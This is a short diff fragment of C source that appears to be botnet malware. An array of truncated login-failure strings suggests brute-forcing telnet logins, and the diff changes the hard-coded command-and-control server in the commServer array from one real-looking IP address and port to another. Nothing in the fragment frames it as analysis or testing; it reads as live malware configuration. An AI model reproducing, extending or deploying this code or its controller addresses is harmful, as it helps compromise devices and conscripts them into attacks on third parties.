@@ -88,7 +88,7 @@ char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "
 
 unsigned char *commServer[] =
 {
-        "144.202.54.51:6667"
+        "5.181.80.188:22"
 };
 
 //    ___                 _
